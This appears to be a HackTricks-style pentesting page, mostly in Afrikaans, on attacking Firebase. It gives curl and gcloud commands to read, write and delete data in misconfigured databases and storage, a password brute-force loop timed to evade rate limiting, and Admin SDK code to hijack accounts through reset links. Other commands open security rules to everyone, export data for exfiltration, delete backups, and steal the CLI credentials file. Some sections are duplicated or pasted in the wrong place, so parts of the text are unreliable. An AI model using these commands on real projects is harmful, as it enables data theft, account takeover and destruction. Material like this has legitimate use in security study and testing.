# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Onautentiseerde toegang tot Firebase Realtime Database
'n Aanvaller het geen spesifieke Firebase-permissies nodig om hierdie aanval uit te voer nie. Dit vereis slegs dat daar 'n kwesbare konfigurasie in die Firebase Realtime Database sekuriteitsreëls is, waar die reëls gestel is met `.read: true` of `.write: true`, wat openbare lees- of skryftoegang toelaat.

Die aanvaller moet die databasis-URL identifiseer, wat gewoonlik die formaat volg: `https://<project-id>.firebaseio.com/`.

Hierdie URL kan gevind word deur mobile application reverse engineering (decompiling Android APKs or analyzing iOS apps), deur konfigurasielêers soos google-services.json (Android) of GoogleService-Info.plist (iOS) te ontleed, deur die bronkode van webtoepassings te inspekteer, of deur netwerkverkeer te ondersoek om versoeke na `*.firebaseio.com` domeine te identifiseer.

Die aanvaller identifiseer die databasis-URL en kontroleer of dit openbaar blootgestel is, en kan dan toegang tot die data kry en moontlik kwaadwillige inligting skryf.

Eerstens kontroleer hulle of die databasis lees-toegang toelaat deur .json aan die URL te heg.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
As die antwoord JSON data of null bevat (in plaas van "Permission Denied"), laat die databasis lees toegang toe. Om skryf toegang te kontroleer, kan die attacker probeer om 'n toets-skryfversoek te stuur met die Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
As die operasie slaag, verleen die databasis ook skryftoegang.


### Blootstelling van data in Cloud Firestore
'n Aanvaller het geen spesifieke Firebase-toestemmings nodig om hierdie aanval uit te voer nie. Dit vereis slegs dat daar 'n kwesbare konfigurasie in die Cloud Firestore-sekuriteitsreëls is waar die reëls lees- of skryftoegang toelaat sonder outentisering of met onvoldoende validasie. 'n Voorbeeld van 'n verkeerd gekonfigureerde reël wat volle toegang verleen, is:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Hierdie reël laat enigiemand toe om alle dokumente te lees en te skryf sonder enige beperkinge. Firestore reëls is fynkorrelig en geld per versameling en dokument, dus kan 'n fout in 'n spesifieke reël slegs sekere versamelings blootstel.

Die aanvaller moet die Firebase Project ID identifiseer, wat gevind kan word deur mobile app reverse engineering, ontleding van konfigurasielêers soos google-services.json of GoogleService-Info.plist, inspeksie van die bronkode van webtoepassings, of analise van netwerkverkeer om versoeke na firestore.googleapis.com te identifiseer.
Die Firestore REST API gebruik die formaat:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
As die reëls ongemagtigde lees-toegang toelaat, kan die aanvaller versamelings en dokumente lees. Eerstens probeer hulle toegang tot 'n spesifieke versameling:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
As die reaksie JSON-dokumente bevat in plaas van 'n toestemmingsfout, is die versameling blootgestel. Die aanvaller kan alle toeganklike versamelings enumereer deur algemene name te probeer of die struktuur van die toepassing te ontleed. Om toegang tot 'n spesifieke dokument te kry:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
As die reëls ongeauthentiseerde skryftoegang toelaat of onvoldoende validering het, kan die aanvaller nuwe dokumente skep:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Om 'n bestaande dokument te wysig, moet PATCH gebruik word:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Om 'n dokument te verwyder en diensweigering te veroorsaak:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Blootstelling van lêers in Firebase Storage
'n Aanvaller het nie enige spesifieke Firebase-toestemmings nodig om hierdie aanval uit te voer nie. Dit vereis slegs dat daar 'n kwesbare konfigurasie is in die Firebase Storage security rules waar die reëls lees- of skryftoegang sonder verifikasie of met onvoldoende validering toelaat. Storage rules beheer lees- en skryftoestemmings onafhanklik, so 'n fout in 'n reël kan slegs lees-toegang, slegs skryf-toegang, of albei blootstel. 'n Voorbeeld van 'n verkeerd-gekonfigureerde reël wat volle toegang verleen is:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Hierdie reël gee lees- en skryf-toegang tot alle dokumente sonder enige beperkings. Firestore-reëls is fynkorrelig en word per collection en per document toegepas, so 'n fout in 'n spesifieke reël kan slegs sekere collections blootstel. Die aanvaller moet die Firebase Project ID identifiseer; dit kan gevind word deur mobiele toepassing reverse engineering, ontleding van konfigurasielêers soos google-services.json of GoogleService-Info.plist, inspeksie van webapp-bronkode, of network traffic analysis om versoeke na firestore.googleapis.com te identifiseer.

Die Firestore REST API gebruik die formaat: `https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

As die reëls lees-toegang sonder verifikasie toelaat, kan die aanvaller collections en documents lees. Eerstens probeer hulle toegang tot 'n spesifieke collection kry.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Indien die reaksie die lys van lêers bevat in plaas van 'n toestemmingsfout, is die lêer blootgestel. Die aanvaller kan die inhoud van die lêers sien deur hul pad te spesifiseer:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
As die rules onbevoegde skryftoegang toelaat of onvoldoende validering het, kan die attacker kwaadwillige lêers oplaai. Om 'n lêer deur die REST API op te laai:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
Die aanvaller kan code shells, malware payloads, of groot lêers oplaai om 'n denial of service te veroorsaak. As die toepassing opgelaaide lêers verwerk of uitvoer, kan die aanvaller remote code execution bewerkstellig. Om lêers te verwyder en 'n denial of service te veroorsaak:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Aanroeping van openbare Firebase Cloud Functions
An attacker benodig nie enige spesifieke Firebase permissions om hierdie probleem uit te buit nie; dit vereis slegs dat 'n Cloud Function publieklik oor HTTP toeganklik is sonder authentication.

'n funksie is kwesbaar wanneer dit onveilig gekonfigureer is:

- Dit gebruik functions.https.onRequest, wat nie authentication afdwing nie (in teenstelling met onCall functions).
- Die funksie se kode valideer nie user authentication nie (bv. geen kontrole vir request.auth of context.auth nie).
- Die funksie is publieklik toeganklik in IAM, wat beteken allUsers het die roles/cloudfunctions.invoker rol. Dit is die default behavior vir HTTP functions tensy die ontwikkelaar toegang beperk.

Firebase HTTP Cloud Functions word blootgestel deur URL'e soos:

- https://<region>-<project-id>.cloudfunctions.net/<function-name>
- https://<project-id>.web.app/<function-name> (when integrated with Firebase Hosting)

An attacker kan hierdie URLs ontdek deur source code analysis, network traffic inspection, enumeration tools, or mobile app reverse engineering.
If the function is publicly exposed and unauthenticated, the attacker can invoke it directly without credentials.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
As die funksie nie insette behoorlik valideer nie, kan die aanvaller ander aanvalle probeer, soos code injection of command injection.


### Brute-force attack against Firebase Authentication with a weak password policy
’n Aanvaller het geen spesifieke Firebase permissions nodig om hierdie aanval uit te voer nie. Dit vereis slegs dat die Firebase API Key blootgestel is in mobiele of webtoepassings, en dat die wagwoordbeleid nie met meer stringe vereistes as die verstek ingestel is nie.

Die aanvaller moet die Firebase API Key identifiseer, wat gevind kan word deur mobile app reverse engineering, ontleding van konfigurasielêers soos google-services.json of GoogleService-Info.plist, inspeksie van die bronkode van webtoepassings (bv. in bootstrap.js), of analise van netwerkverkeer.

Firebase Authentication’s REST API gebruik die endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
om met e-pos en wagwoord te autentikeer.

As Email Enumeration Protection gedeaktiveer is, kan API-foutantwoorde openbaar of ’n email in die stelsel bestaan (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), wat aanvallers toelaat om bestaande gebruikers te identifiseer voordat hulle wagwoordraaisels probeer. Wanneer hierdie beskerming geaktiveer is, gee die API dieselfde foutboodskap vir beide nie-bestaande emails en verkeerde wagwoorde, wat gebruikersenumerasie voorkom.

Dit is belangrik om daarop te let dat Firebase Authentication rate limiting afdwing, wat versoeke kan blokkeer as te veel autentikasiepogings binne ’n kort tyd plaasvind. Daarom sal ’n aanvaller vertragings tussen pogings moet inbring om te voorkom dat versoeke deur die rate limiting geblokkeer word.

Die aanvaller identifiseer die API Key en voer autentikasiepogings uit met veelvuldige wagwoorde teen bekende rekeninge. As Email Enumeration Protection gedeaktiveer is, kan die aanvaller bestaande gebruikers identifiseer deur die foutantwoorde te ontleed:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
As die reaksie EMAIL_NOT_FOUND bevat, bestaan die e-pos nie in die stelsel nie. As dit INVALID_PASSWORD bevat, bestaan die e-pos wel, maar die wagwoord is verkeerd, wat bevestig dat die gebruiker geregistreer is. Sodra 'n geldige gebruiker geïdentifiseer is, kan die aanvaller brute-force attempts uitvoer. Dit is belangrik om pouses tussen pogings in te sluit om Firebase Authentication se rate-limiting-meganismes te vermy:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
With the default password policy (minimum 6 characters, no complexity requirements), the attacker can try all possible combinations of 6-character passwords, which represents a relatively small search space compared to stricter password policies.

### Gebruikersbestuur in Firebase Authentication

Die aanvaller benodig spesifieke Firebase Authentication-permissies om hierdie aanval uit te voer. Die vereiste permissies is:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to retrieve user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

Hierdie permissies is ingesluit in die `roles/firebaseauth.admin` rol, wat volle lees/skryf-toegang tot Firebase Authentication-bronne verleen. Hulle is ook ingesluit in hoërvlak rolle soos `roles/firebase.developAdmin` (which includes all firebaseauth.* permissions) en `roles/firebase.admin` (full access to all Firebase services).

Om die Firebase Admin SDK te gebruik, sou die aanvaller toegang tot service account credentials (JSON file) benodig, wat moontlik op gekompromitteerde stelsels, publiek blootgestelde code repositories, gekompromitteerde CI/CD-stelsels, of deur die kompromittering van developer accounts wat toegang tot hierdie credentials het, gevind kan word.

Die eerste stap is om die Firebase Admin SDK te konfigureer met service account credentials.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Om 'n malicious user te skep met 'n victim se email, sou die attacker probeer om die Firebase Admin SDK te gebruik om 'n nuwe account onder daardie email te genereer.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Om 'n bestaande gebruiker te wysig, sou die attacker velde bywerk soos die e-posadres, die verifikasiestatus of die feit of die rekening gedeaktiveer is.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Om 'n gebruikersrekening te verwyder en 'n denial of service te veroorsaak, sou die aanvaller 'n versoek stuur om die gebruiker heeltemal te verwyder.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Die attacker kan ook inligting oor bestaande gebruikers terugkry deur hul UID of e-posadres aan te vra.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Daarbenewens kan die aanvaller verifikasie-skakels of wagwoord-herstelskakels genereer om 'n gebruiker se wagwoord te verander en toegang tot hul rekening te kry.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Gebruikersbestuur in Firebase Authentication
'n aanvaller benodig spesifieke Firebase Authentication-magtigings om hierdie aanval uit te voer. Die vereiste magtigings is:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to obtain user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

Hierdie magtigings is ingesluit in die roles/firebaseauth.admin-rol, wat volledige lees/skryf-toegang tot Firebase Authentication-bronne verleen. Hulle is ook deel van hoërvlak-rolle soos `roles/firebase.developAdmin` (wat alle firebaseauth.* magtigings insluit) en `roles/firebase.admin` (volledige toegang tot alle Firebase-dienste).

Om die Firebase Admin SDK te gebruik, sou die aanvaller toegang tot diensrekeningsbewyse (n JSON-lêer) benodig, wat verkry kan word vanaf gekompromiseerde stelsels, publiek-blootgestelde kode-repositorys, gekompromiseerde CI/CD-omgewings, of deur die kompromittering van ontwikkelaarsrekeninge wat toegang tot hierdie bewysstukke het.

Die eerste stap is om die Firebase Admin SDK te konfigureer met behulp van die diensrekeningsbewyse.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Om 'n kwaadwillige gebruiker te skep deur 'n slagoffer se e-pos te gebruik, sou die aanvaller probeer om 'n nuwe gebruikersrekening met daardie e-pos aan te maak en hul eie wagwoord en profielinligting toe te ken.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Om 'n bestaande gebruiker te wysig, sou die attacker velde verander, soos die e-posadres, die verifikasiestatus of die toestand van die rekening (gedeaktiveer of nie).
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Om 'n gebruikersrekening te verwyder—wat effektief 'n denial of service veroorsaak—sou die aanvaller 'n versoek stuur om daardie gebruiker permanent te verwyder.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
The attacker kon ook inligting oor bestaande gebruikers bekom, soos hul UID of email, deur gebruikersbesonderhede op te vra of per UID of per emailadres.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Verder kan die aanvaller verifikasie links of password-reset links genereer, wat hulle in staat stel om die wagwoord van ’n gebruiker te verander en die rekening oor te neem.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Wysiging van sekuriteitsreëls in Firebase-dienste
Die aanvaller het spesifieke toestemmings nodig om sekuriteitsreëls te wysig, afhangend van die diens. Vir Cloud Firestore en Firebase Cloud Storage is die vereiste toestemmings `firebaserules.rulesets.create` om rulesets te skep en `firebaserules.releases.create` om releases te ontplooi. Hierdie toestemmings is ingesluit in die `roles/firebaserules.admin` rol of in hoërvlakrolle soos `roles/firebase.developAdmin` en `roles/firebase.admin`. Vir Firebase Realtime Database is die vereiste toestemming `firebasedatabase.instances.update`.

Die aanvaller moet die Firebase REST API gebruik om die sekuriteitsreëls te wysig.
Eerstens sal die aanvaller 'n toegangstoken moet verkry deur diensrekeningbewyse te gebruik.
Om die toegangstoken te verkry:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Om Firebase Realtime Database-reëls te wysig:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Om Cloud Firestore-reëls te wysig, moet die aanvaller 'n ruleset skep en dit dan ontplooi:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Die vorige kommando gee ’n ruleset-naam terug in die formaat projects/<project-id>/rulesets/<ruleset-id>. Om die nuwe weergawe te ontplooi, moet die release bygewerk word met ’n PATCH request:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Om Firebase Cloud Storage-reëls te wysig:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Die vorige opdrag gee 'n ruleset-naam terug in die formaat projects/<project-id>/rulesets/<ruleset-id>. Om die nuwe weergawe te ontplooi, moet die release met 'n PATCH request opgedateer word:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Data exfiltration and manipulation in Cloud Firestore
Cloud Firestore gebruik dieselfde infrastruktuur en toestemmingsisteem as Cloud Datastore, dus geld Datastore IAM permissions direk vir Firestore. Om TTL-beleid te manipuleer, is die permissie `datastore.indexes.update` benodig. Om data uit te voer, is die permissie `datastore.databases.export` benodig. Om data te importeer, is die permissie datastore.databases.import benodig. Om massiewe dataverwydering uit te voer, is die permissie `datastore.databases.bulkDelete` benodig.

Vir rugsteun- en hersteloperasies is spesifieke permissies benodig:

- `datastore.backups.get` and `datastore.backups.list` om beskikbare rugsteune te lys en besonderhede daarvan te kry
- `datastore.backups.delete` om rugsteune te verwyder
- `datastore.backups.restoreDatabase` om 'n databasis uit 'n rugsteun te herstel
- `datastore.backupSchedules.create` and `datastore.backupSchedules.delete` om rugsteunskedules te bestuur

Wanneer 'n TTL-beleid geskep word, word 'n aangewese eienskap gekies om entiteite te identifiseer wat geskik is vir verwydering. Hierdie TTL-eienskap moet van die datum- en tydtipe wees. Die aanvaller kan 'n eienskap kies wat reeds bestaan of 'n eienskap aanwys wat hulle later beplan om by te voeg. As die waarde van die veld 'n datum in die verlede is, word die dokument geskik vir onmiddellike verwydering. Die aanvaller kan die gcloud CLI gebruik om TTL-beleid te manipuleer.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Om data uit te voer en te exfiltrate, kan die aanvaller die gcloud CLI gebruik.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Om kwaadwillige data in te voer:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Om massadataverwydering uit te voer en 'n denial of service te veroorsaak, kan die aanvaller die gcloud Firestore bulk-delete tool gebruik om hele versamelings te verwyder.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Vir backup- en restore-operasies kan die aanvaller geskeduleerde backups skep om die huidige toestand van die database vas te vang, bestaande backups te lys, vanaf 'n backup te restore om onlangse veranderings oor te skryf, backups te verwyder om permanente dataverlies te veroorsaak, en geskeduleerde backups te verwyder.
Om 'n daaglikse backup-skedule te skep wat onmiddellik 'n backup genereer:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Om van 'n spesifieke rugsteun te herstel, kan die aanvaller 'n nuwe databasis skep wat die data in daardie rugsteun bevat. Die hersteloperasie skryf die rugsteun se data in 'n nuwe databasis, wat beteken dat 'n bestaande DATABASE_ID nie gebruik kan word nie.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Om 'n rugsteun te verwyder en permanente dataverlies te veroorsaak:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Diefstal en misbruik van Firebase CLI credentials
’n Aanvaller het nie spesifieke Firebase-permissies nodig om hierdie aanval uit te voer nie, maar hy/sy het toegang tot die ontwikkelaar se plaaslike stelsel of die Firebase CLI credentials-lêer nodig. Hierdie credentials word in ’n JSON-lêer gestoor, geleë by:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Hierdie lêer bevat authentication tokens, insluitend die refresh_token en access_token, wat die aanvaller toelaat om as die gebruiker wat oorspronklik firebase login uitgevoer het, te autentiseer.

Die aanvaller verkry toegang tot die Firebase CLI credentials-lêer. Hulle kan dan die hele lêer na hul eie stelsel kopieer, en die Firebase CLI sal outomaties die credentials vanaf sy verstek-ligging gebruik. Nadat dit gedoen is, kan die aanvaller alle Firebase projekte sien wat vir daardie gebruiker toeganklik is.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
